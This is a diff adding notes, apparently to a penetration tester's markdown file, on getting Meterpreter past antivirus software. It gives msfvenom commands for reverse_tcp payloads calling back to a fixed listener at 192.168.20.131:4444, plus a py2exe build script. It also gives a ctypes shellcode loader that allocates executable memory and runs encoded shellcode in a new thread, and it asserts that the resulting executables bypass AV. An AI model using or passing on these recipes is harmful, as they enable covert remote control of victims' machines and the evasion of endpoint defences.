@@ -206,3 +206,84 @@ Here, issue `net use * \\10.10.10.130\C$` to mount C:\ at Z:\, then cmd to Z:\, 
 - http://web.archive.org/web/20170708111726/https://wiki.apache.org/myfaces/Secure_Your_Application
 - https://myfaces.apache.org/core22/myfaces-impl/webconfig.html
 - https://github.com/apache/myfaces/blob/master/impl/src/main/java/org/apache/myfaces/application/viewstate/StateUtils.java#L237
+
+
+# About Meterpreter Antivirus Bypass - Py2exe
+
+- Generate Payload: `msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.20.131 LPORT=4444 -f raw -o /tmp/mrtp.py`
+- Install Python 2.7 with x86 version of Py2exe (MUST BE x86, even you are x86_64)
+
+Write `setup.py` for building:
+
+```python
+#!/usr/bin/env python2
+#-*- encoding:utf-8 -*-
+
+from distutils.core import setup
+import py2exe
+
+setup(
+name = "Meter",
+description = "Python-based App",
+version = "1.0",
+console = ["mrtp.py"],
+options = {"py2exe":{"bundle_files":1,"packages":"ctypes","includes":"base64,sys,socket,struct,time,code,platform,getpass,shutil",}},
+zipfile = None
+)
+```
+
+Then run: `python ./setup.py py2exe`, it is able to bypass AV now.
+
+# About Meterpreter Antivirus Bypass - PyInstaller
+
+- Generate shell code: `msfvenom -p windows/meterpreter/reverse_tcp LPORT=4444 LHOST=192.168.20.131  -e x86/shikata_ga_nai -i 11 -f py -o  /tmp/mytest.py`
+
+Build your payload:
+
+```python
+#!/usr/bin/env python2
+#-*- encoding:utf-8 -*-
+
+import ctypes
+
+def execute():
+    # Bind shell
+    shellcode = bytearray(
+    "\xbe\x24\x6e\x0c\x71\xda\xc8\xd9\x74\x24\xf4\x5b\x29"
+    "\xc9\xb1\x99\x31\x73\x15\x03\x73\x15\x83\xeb\xfc\xe2"
+    <HERE IS YOUR FULL SHELL CODE!>
+    "\xd1\xb4\xdb\xa8\x6d\x6d\x10\x17\x33\xf9\x2c\x93\x2b"
+    "\x0b\xcb\x94\x1a\xd9\xfd\xc7\x78\x26\xb3\x57\xea\x6d"
+    "\x37\xa5\x48\xea\x47\xf6\x81\x90\x07\xc6\x62\x9a\x56"
+    "\x13"
+     )
+
+    ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
+    ctypes.c_int(len(shellcode)),
+    ctypes.c_int(0x3000),
+    ctypes.c_int(0x40))
+
+    buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
+
+    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
+    buf,
+    ctypes.c_int(len(shellcode)))
+
+    ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
+    ctypes.c_int(0),
+    ctypes.c_int(ptr),
+    ctypes.c_int(0),
+    ctypes.c_int(0),
+    ctypes.pointer(ctypes.c_int(0)))
+
+    ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),
+    ctypes.c_int(-1))
+if __name__ == "__main__":
+    execute()
+```
+
+- Install pywin32 and pyinstaller
+- Run `pyinstaller.py -F --console myshellcode.py`
+
+it is able to bypass AV now.
+
